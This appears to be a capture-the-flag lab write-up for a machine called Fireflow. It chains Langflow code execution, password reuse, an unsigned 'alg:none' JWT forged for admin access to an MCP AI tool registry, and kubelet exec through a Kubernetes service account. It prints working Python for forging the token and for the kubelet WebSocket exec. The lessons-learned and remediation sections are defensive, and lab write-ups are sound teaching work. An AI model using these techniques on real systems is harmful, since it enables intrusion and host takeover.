Executive Summary

Fireflow exposed an HTTPS landing page that led to a Langflow instance hosted on flow.fireflow.htb. Langflow was vulnerable to unauthenticated code execution through its public temporary flow build endpoint. This provided initial access as www-data.

Post-exploitation enumeration revealed Langflow superuser credentials in environment variables. The password was reused by the local Linux user nightfall, allowing SSH access and retrieval of the user flag. Further enumeration uncovered an MCP AI Tool Registry running inside Kubernetes. The registry accepted unsigned JWTs using alg:none, allowing an admin token to be forged. Admin access allowed registration of a malicious MCP tool, resulting in code execution inside the MCP pod. The pod's Kubernetes service account had access to nodes/proxy, which was abused to reach the kubelet and execute commands inside a privileged node-exporter pod. Because node-exporter mounted the host filesystem, the root flag was read from the host path.

Completed attack chain: HTTPS vhost discovery → Langflow CVE-2026-33017 RCE → www-data → LinPEAS/env credential leak → SSH as nightfall → MCP config disclosure → JWT alg:none admin bypass → MCP pod shell → Kubernetes nodes/proxy → node-exporter host mount → root.txt

Phase 8: JWT alg:none Authentication Bypass

A forged unsigned JWT was created with role=admin. Because the MCP service accepted alg:none, the token was accepted without a valid signature. 

ADMIN_TOKEN=$(python3 - <<'PY'
import base64, json

def b64url(obj):
    return base64.urlsafe_b64encode(
        json.dumps(obj, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "langflow-bot", "role": "admin"}
print(b64url(header) + "." + b64url(payload) + ".")
PY
)

Failed Custom Function Approach

Initial custom tools used a def run() function and registered successfully, but the MCP call returned blank output and did not produce side effects. This showed that the payload needed to execute as top-level Python code and detach from the HTTP request.

Phase 12: Kubelet Exec into node-exporter

The intended root path was kubelet /exec against the privileged prometheus-prometheus-node-exporter-nmntq pod. Direct access to kubelet port 10250 from the Parrot attacker machine was filtered during testing, so the final execution was performed from inside the MCP execution context, which could reach the kubelet internally. The kubelet endpoint required a WebSocket upgrade using the Kubernetes v4.channel.k8s.io protocol.

External Kubelet Test

nmap -p 10250,6443 10.129.22.117
10250/tcp filtered
6443/tcp  open

The walkthrough method using websocat directly from Parrot did not work in this instance because 10250 was filtered externally. The workaround was to register an MCP tool that created the WebSocket connection from inside the target-side MCP container.

Python WebSocket Kubelet Exec from MCP

import socket, ssl, base64, os, struct, time

TOKEN = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
HOST = "10.129.22.117"
PORT = 10250
PATH = "/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=whoami"

key = base64.b64encode(os.urandom(16)).decode()
req = (
    f"GET {PATH} HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "Sec-WebSocket-Protocol: v4.channel.k8s.io\r\n"
    f"Authorization: Bearer {TOKEN}\r\n"
    "\r\n"
)

ctx = ssl._create_unverified_context()
s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=5), server_hostname=HOST)
s.settimeout(5)
s.sendall(req.encode())

Lessons Learned

  • Version discovery matters: identifying Langflow and its version exposed a public-flow RCE path.
  • Environment variables can contain high-value credentials: the Langflow superuser password was exposed through process environment variables.
  • Password reuse still matters: the Langflow password also worked for the Linux user nightfall.
  • JWT algorithm confusion is dangerous: accepting alg:none allowed an unsigned admin token to bypass MCP authorization.
  • MCP tooling expands attack surface: endpoints that register or execute AI tools should be treated like code execution interfaces.
  • Kubernetes service account permissions need strict review: nodes/proxy can allow kubelet access and should be treated as a highly sensitive permission.
  • Privileged monitoring pods are valuable targets: node-exporter commonly has host mounts that can expose the host filesystem.

Remediation Recommendations

  • Upgrade Langflow to a version that patches public flow code execution issues.
  • Disable unauthenticated/public flow build endpoints unless explicitly required.
  • Never store reusable service or local-user passwords in environment variables.
  • Enforce unique passwords for application users and operating system users.
  • Reject JWTs using alg:none and enforce a strict allowlist of secure algorithms.
  • Do not allow API endpoints to register arbitrary executable code without sandboxing and strong authorization.
  • Remove nodes/proxy from non-administrative Kubernetes service accounts.
  • Review privileged pods and hostPath mounts, especially monitoring and logging workloads.

Final Attack Path

1. Nmap discovered SSH and HTTPS.
2. HTTPS certificate and page source revealed fireflow.htb and flow.fireflow.htb.
3. flow.fireflow.htb hosted Langflow 1.8.2 with a public playground.
4. The public build endpoint accepted modified flow JSON with Python code.
5. RCE produced a shell as www-data.
6. LinPEAS/env enumeration revealed Langflow superuser credentials.
7. The password was reused for SSH as nightfall.
8. nightfall's .mcp/config.json disclosed MCP registry credentials.
9. MCP /api/v1/version disclosed JWT support for HS256 and none.
10. A forged alg:none JWT with role=admin bypassed authorization.
11. Admin API access registered a malicious top-level Python MCP tool.
12. Calling the tool produced a shell inside the MCP Kubernetes pod.
13. The pod's service account token had nodes/proxy access.
14. Direct kubelet access from Parrot was filtered, so kubelet exec was performed from inside the MCP execution context.
15. node-exporter mounted the host root filesystem at /host/root.
16. root.txt was read from /host/root/root/root.txt.
